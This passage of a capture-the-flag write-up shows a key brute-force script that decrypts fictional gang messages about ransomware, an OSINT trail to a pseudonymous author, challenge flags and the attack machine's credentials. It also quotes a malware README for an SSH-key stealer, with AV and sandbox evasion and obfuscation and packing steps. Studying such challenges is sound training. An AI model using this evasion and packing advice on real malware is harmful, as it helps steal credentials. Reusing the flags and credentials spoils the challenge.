16:45:00"},{"content":"pUIZxZCVD1NPrBizX9mu0IfzZ5uU25geKjZT4tWBGNo5edwKPVKheJ1dAPJuyNd9OARjDZvG5TeI1PJR2FU/OpZAqNshMV8uNe7BhKs8Q3BdCEN006rIWHodgCPocIWq","isEncrypted":true,"sender":"Agent-03","timestamp":"2025-04-06 11:15:00"},{"content":"ynyy1UhTmMlB+Os5+lfYEjcuEa3AeqAp5uGOoFbaXRRWhpizub+0zBIoWMsdDId/Nh3ZYettlergBjXJ3fBBwwPQA70HYGTVArvgmJUabnc=","isEncrypted":true,"sender":"Agent-01","timestamp":"2025-04-06 14:20:00"},{"content":"tgegcyIclLXvwmaY1EifYyMoHXeVzQ8RPCRitU7nfSohs4428XGvkA1wS1AM/L+Y74CFOsfLEkfJWbvI3QJRE81TMoAbofbgW5Y1sDwOQQknrRHWh8cX+/xIGVOcg/P/","isEncrypted":true,"sender":"Agent-00","timestamp":"2025-04-07 09:00:00"}]}
```

Now I need to found how to decrypt them :

![alt text](note/ctf/asset/DGSENull6.png)

IV : LJo+0sanl6E3cvCHCRwyIg==
SALT : s3cr3t_s@lt

I also find the encryption algorithm, which uses the phone's `model` and `brand` to decrypt the messages :

![alt text](note/ctf/asset/DGSENull7.png)

I find an online source listing all models and builds, which will be useful (knowing it's an old Google tablet) :
https://storage.googleapis.com/play_public/supported_devices.csv

I will recreate the algo :

```python
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import csv

STATIC_IV = base64.b64decode("LJo+0sanl6E3cvCHCRwyIg==")
STATIC_SALT = "s3cr3t_s@lt"

# Load all MODEL:BRAND pairs from supported_devices.csv
candidate_pairs = []
with open("supported_devices.csv", newline='', encoding="utf-16") as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        model = row["Model"].strip()
        brand = row["Retail Branding"].strip()
        if model and brand:
            candidate_pairs.append((model, brand))

# Message list
messages = [
    {"content": "M2geCVKOzPlyug9p9DvthxPip0oe9BPiT2sDfFhWy7iC3+JQI4SfO7+SLAlFSUmu8LoGj1hrUWil/uNXvc+5mKBMrRNFQT8ijBK14P0Z8qA=", "sender": "Agent-02", "timestamp": "2025-04-01 08:00:00"},
    {"content": "//5PBsYWhHlgqhVgG1omUyevzmlErLZVsTCLO78Rbb9qBMPnsKCS5/RZ4GEdWRBPiZ4BtO5h7j2PuIutfqf7ag==", "sender": "Agent-1337", "timestamp": "2025-04-01 10:00:00"},
    {"content": "2uNMSnJZa5JExhYgNA+V3RAiafhuLkj8Jnr4U+lSZOrrpMWjyA13w0Do3IIPcVBgK070rmweRKX/GkCAxat4i3JfWk1UvWNSmEZbHQlFznR7VFW6FKK84iJKhiDOp8Tk", "sender": "Agent-01", "timestamp": "2025-04-02 15:30:00"},
    {"content": "Swz/ycaTlv3JM9iKJHaY+f1SRyKvfQ5miG6I0/tUb8bvbOO+wyU5hi+bGsmcJD3141FrmrDcBQhtWpYimospymABi3bzvPPi01rPI8pNBq8=", "sender": "Agent-02", "timestamp": "2025-04-03 13:20:00"},
    {"content": "NAe44oieygG7xzLQT3j0vN+0NoPNUu0TAaid9Az3IlpcKwR0lSKaPT8F4y1zpbArWFIGpgzsPZtPAwL50qocTRMG/g5u+/wcc1nxmhBjCbg=", "sender": "Agent-04", "timestamp": "2025-04-04 08:30:00"},
    {"content": "dfeKlZP/gIntHySBYine2YUlNiX3LjlMOLu7y9tgprFyJIIcQpfghlQXut6cJUG2wtzGBVQUm7ITdpLNeVaZjamQHhPWEtNIJE/xtFg66Klui1qCKYKSrmZ4wm1CG/ZPy4csqbM28Ur8dts7XoV5FA==", "sender": "Agent-04", "timestamp": "2025-04-05 16:45:00"},
    {"content": "pUIZxZCVD1NPrBizX9mu0IfzZ5uU25geKjZT4tWBGNo5edwKPVKheJ1dAPJuyNd9OARjDZvG5TeI1PJR2FU/OpZAqNshMV8uNe7BhKs8Q3BdCEN006rIWHodgCPocIWq", "sender": "Agent-03", "timestamp": "2025-04-06 11:15:00"},
    {"content": "ynyy1UhTmMlB+Os5+lfYEjcuEa3AeqAp5uGOoFbaXRRWhpizub+0zBIoWMsdDId/Nh3ZYettlergBjXJ3fBBwwPQA70HYGTVArvgmJUabnc=", "sender": "Agent-01", "timestamp": "2025-04-06 14:20:00"},
    {"content": "tgegcyIclLXvwmaY1EifYyMoHXeVzQ8RPCRitU7nfSohs4428XGvkA1wS1AM/L+Y74CFOsfLEkfJWbvI3QJRE81TMoAbofbgW5Y1sDwOQQknrRHWh8cX+/xIGVOcg/P/", "sender": "Agent-00", "timestamp": "2025-04-07 09:00:00"},
]

def derive_key(model, brand):
    device_id = f"{model}:{brand}"
    device_id_hash = hashlib.sha256(device_id.encode()).digest()
    device_id_hash_b64 = base64.b64encode(device_id_hash).decode()
    key_material = f"{device_id_hash_b64}:{STATIC_SALT}"
    return hashlib.sha256(key_material.encode()).digest()

def try_decrypt(encrypted_b64):
    ciphertext = base64.b64decode(encrypted_b64)
    for model, brand in candidate_pairs:
        key = derive_key(model, brand)
        cipher = AES.new(key, AES.MODE_CBC, STATIC_IV)
        try:
            decrypted = cipher.decrypt(ciphertext)
            plaintext = unpad(decrypted, AES.block_size).decode("utf-8")
            print(f"[SUCCESS] {model}:{brand} => {plaintext}")
        except:
            continue

print("=== Brute-forcing with full Google device list ===\n")

for msg in messages:
    print(f"--- Trying {msg['sender']} ({msg['timestamp']}) ---")
    try_decrypt(msg["content"])
```

and obtain :

```
=== Brute-forcing with full Google device list ===

--- Trying Agent-02 (2025-04-01 08:00:00) ---
[SUCCESS] Yellowstone:Google => Target acquired. Hospital network vulnerable. Initiating ransomware deployment.
--- Trying Agent-1337 (2025-04-01 10:00:00) ---
[SUCCESS] Yellowstone:Google => Keep this safe. RM{788e6f3e63e945c2a0f506da448e0244ac94f7c4}
--- Trying Agent-01 (2025-04-02 15:30:00) ---
[SUCCESS] Yellowstone:Google => New target identified. School district network. Estimated payout: 500k in crypto.
--- Trying Agent-02 (2025-04-03 13:20:00) ---
[SUCCESS] Yellowstone:Google => New ransomware strain ready for deployment. Testing phase complete.
--- Trying Agent-04 (2025-04-04 08:30:00) ---
[SUCCESS] Yellowstone:Google => Security patch released. Need to modify attack vector. Meeting at usual place.
--- Trying Agent-04 (2025-04-05 16:45:00) ---
[SUCCESS] Yellowstone:Google => New zero-day exploit in a linux binary discovered. Perfect for next operation. Details incoming.
--- Trying Agent-03 (2025-04-06 11:15:00) ---
--- Trying Agent-01 (2025-04-06 14:20:00) ---
--- Trying Agent-00 (2025-04-07 09:00:00) ---
```

## OSINT :

Amoung my investigation i was able to collect some infos and linked them

A phone number from reverse : `+1337133742069`

the ip of the attacking machine from SOC : `163.172.67.201`

the credentials for operator account of the attacking machine : `LGSA5l1%YHngd&GbjxR4Or operator`

and the notes contains in the vault with the creds that says : `SSH password for the attacking machine. The IP address changes regularly, please refer to the last operation to obtain it.`

The last operation was identified with the SOC challenge so I might be able to connect to this machine using creds (nmap confirm ssh is open)

Once connected using the credentials I found a folder containing 3 tools : apkfuscator / nightshade / onlymacro

Nightshade...This was the pyc that allow exfiltration ! and a readme is linked to it !

```
# NullVastation - Silence the noise, embrace the void

- By **voidSyn42**

## 🔥 Overview

Nightshade is a precision-oriented extraction utility developed for advanced post-exploitation phases. Designed to operate in stealth, it silently gathers critical authentication material while actively evading heuristic analysis and sandbox detection.

**Targets:**

- `~/.ssh/id_rsa` private keys
- Detection of antivirus processes
- Sandbox evasion through behavioral checks

---

## ⚙ Requirements

- Python 3.7+
- pycryptodome & psutil
- PyInstaller (for compilation)
- Linux (preferred targets)

---

## 📦 Setup & Compilation

To deploy the utility in a portable format:

```bash
pip install pyinstaller
pyinstaller --onefile nightshade.py
```

This will generate a standalone binary under the /dist directory.

Optional flags:

- `--noconsole`: Suppress terminal window (for GUI-based or silent deployments)

- `--clean`: Strip build files

Example:

```bash
pyinstaller --onefile --noconsole --clean nightshade.py
```

# 🕳 Obfuscation (Recommended)

To increase stealth and resist static analysis:

1. Basic Code Obfuscation
   Use pyarmor to encrypt and obfuscate source:

```bash
pip install pyarmor
pyarmor obfuscate nightshade.py
```

Then compile the obfuscated script:

```bash
pyinstaller --onefile dist/nightshade.py
```

2. Binary Packing (Optional)
   After compilation, you can compress or pack the binary using UPX:

```bash
upx --best --ultra-brute dist/nightshade.py
```

# 🔍 Functionality Breakdown

- ✅ Checks for common sandbox artifacts (e.g. low uptime, known usernames, virtualized hardware)

- ✅ Scans for AV-related processes and services

- ✅ Extracts and exfiltrates SSH private keys (id_rsa)

- ✅ Logs system fingerprint data

_"We do not speak. We do not forget. We unmake."_
```

so now i got a username : voidSyn42

I will use Maigret on this pseudo and found : 
```
[+] Docker Hub: https://hub.docker.com/u/voidsyn42/
        ├─uid: a7ff01bbb6ad40e58c11f3c8e30e6154
        ├─username: voidsyn42
        ├─full_name: Pierre Lapresse
        ├─location: Unkown
        ├─type: User
        ├─gravatar_url: https://gravatar.com/
        └─gravatar_username: voidsyn42
```

And here is our man !

flag : `RM{lapresse.pierre}`

final tab for osint (maltego) :

![alt text](note/ctf/asset/DGSENull8.png)